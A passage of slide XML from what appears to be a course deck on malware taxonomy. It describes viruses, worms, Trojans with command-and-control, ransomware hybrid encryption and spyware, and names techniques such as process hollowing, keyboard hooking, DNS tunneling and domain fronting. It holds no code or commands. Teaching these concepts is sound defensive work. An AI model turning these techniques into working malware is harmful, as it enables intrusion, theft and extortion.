          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Execution Trigger:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The specific condition or state required to activate the payload (e.g., user action, system startup, logic bomb timer).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Payload:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The actual unauthorized actions executed on the target host (e.g., encryption, exfiltration, credential harvesting).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>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Operational Objectives</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>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Industrial Espionage:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Covert data harvesting (MITRE ATT&amp;CK TA0009).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Financial Extortion:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Cryptographic locking of files to demand ransom.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sabotage &amp; Disruption:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Destroying data or denying service.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Resource Hijacking:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Recruiting hardware into command-and-control networks.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Taxonomy of Malicious Software (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_malware_taxonomy_tree.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1430529" y="1330000"/>
            <a:ext cx="825540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Formal malware taxonomy organized by propagation vector, execution trigger, and payload, the three parameters that define every malware specimen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Computer Viruses &amp; Host Evasion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virus</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a self-replicating program that propagates by inserting its malicious code into another executable file, script, or document. It requires a host carrier and human intervention to transition between systems.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="10555354" cy="119862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Infection Phase:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The virus locates a target executable (e.g., PE or ELF file) and appends, prepends, or inserts its code into the binary structure.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dormant Phase:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The virus remains inactive, evading signature detection by mimicking normal system operations or waiting for a trigger.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Propagation Phase:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The user runs the infected host program, loading the virus into RAM with the user's execution privileges, scanning the filesystem to infect other clean binaries.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Execution Phase:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The trigger condition fires, executing the payload to compromise data integrity or system availability.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Computer Viruses &amp; Host Evasion (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_virus_infection_lifecycle.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1528158" y="1330000"/>
            <a:ext cx="806015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virus infection lifecycle, from host file injection through dormancy, propagation, and payload execution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Worms &amp; Autonomous Propagation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worm</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a self-contained, self-propagating program that spreads autonomously across network interfaces by exploiting software vulnerabilities in network protocols. It does not require a host program or human intervention.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Worms &amp; Autonomous Propagation (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="2ce5b365542b.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4302398" y="1330000"/>
            <a:ext cx="2511669"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Self-Propagation Mechanics of a Network Worm, each node in this diagram represents an autonomous phase executed without human interaction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Worms &amp; Autonomous Propagation (3/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_worm_propagation_network.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1670150" y="1330000"/>
            <a:ext cx="777616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Exponential worm propagation, each newly infected host immediately begins scanning, causing infection counts to double with each propagation cycle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Trojans &amp; Command-and-Control (C2)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Trojan Horse</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a non-replicating program that appears to perform a legitimate, useful function but contains hidden malicious capabilities. It exploits user trust to bypass authentication and host-based access controls.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>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Delivery &amp; Packaging Methods</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>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Wrappers &amp; Binders:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Utilities that merge a benign executable (e.g., a PDF utility or game) and a malicious payload into a single installer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Process Hollowing:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Launching a legitimate system process (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>svchost.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>) in a suspended state, replacing its memory image with malicious code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Software Cracks/Keygens:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Packaging malware inside software activation tools.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>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Common Trojan Payloads</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>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RATs (Remote Access Trojans):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Establish a persistent backdoor, allowing full administrative control over the filesystem and shell.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Downloader/Dropper:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> A lightweight initial stager designed to download and install more complex malware payloads.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Banking Trojans:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Modify web browser memory (Man-in-the-Browser) to steal session cookies and credentials.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Trojans &amp; Command-and-Control (C2) (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_trojan_c2_architecture.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3542640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="491264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Trojan delivery and Command-and-Control architecture, the malicious payload disguises itself as legitimate software and communicates covertly with an external attacker server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Ransomware &amp; Cryptographic Extortion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Ransomware</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a class of malware designed to deny access to system resources or data, demanding payment (typically in cryptocurrency) in exchange for restoring access. Modern ransomware relies on hybrid cryptography.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>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Initial Access &amp; Staging:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Executed via phishing, compromised Remote Desktop Protocol (RDP) credentials, or secondary droppers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Key Generation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Generates a unique symmetric session key (e.g., AES-256 or ChaCha20) on the victim host.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Targeted Encryption:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Scans local and mapped network drives for high-value extensions (.db.docx.xlsx.pdf) and encrypts them using the session key.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Asymmetric Key Wrap:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Encrypts the local session key with the attacker's public key (RSA-2048 or ECC) and deletes the unencrypted session key from memory.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Double Extortion:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Exfiltrates sensitive data prior to encryption, threatening public release on leak sites to force compliance.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Ransomware &amp; Cryptographic Extortion (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_ransomware_hybrid_crypto.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="2421134"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="37911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Ransomware hybrid cryptography, AES encrypts files at speed while RSA protects the decryption key, making recovery impossible without the attacker's private key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Spyware &amp; Covert Data Capture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Spyware</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is software installed covertly on an endpoint to monitor user activity, harvest credentials, and collect system metadata, transmitting this information back to external entities without authorization.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="5192677" cy="192773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Interception Vectors</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>
            <a:ext cx="5072677" cy="14777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Keyboard Hooking:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Intercepting keystroke interrupts by leveraging OS APIs (such as </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>SetWindowsHookEx</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> in Windows) before they reach the target application.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Form Grabbing:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Injecting code into web browser processes (e.g., using DLL injection) to steal form data in cleartext before it is TLS-encrypted.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Screen Scraping:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Capturing frames of the active display buffer to harvest visual security codes or virtual keyboard clicks.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>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Exfiltration &amp; Covert Channels</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>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DNS Tunneling:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Encoding stolen data within DNS query subdomains to bypass standard outbound firewall rules.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HTTPS Beaconing:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Making outbound web requests structured to look like normal telemetry traffic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Domain Fronting:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Routing traffic through large CDN providers to hide the ultimate command-and-control destination.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Spyware &amp; Covert Data Capture (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_spyware_exfiltration_channels.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Spyware interception and exfiltration architecture, data is captured at the OS API layer before encryption and sent covertly through allowed traffic channels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Technical Comparison of Malware Classes</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2366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Malware Class</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Propagation Vector</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Human Interaction</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CIA Pillar Impacted</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Key Defensive Controls (NIST SP 800-53)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
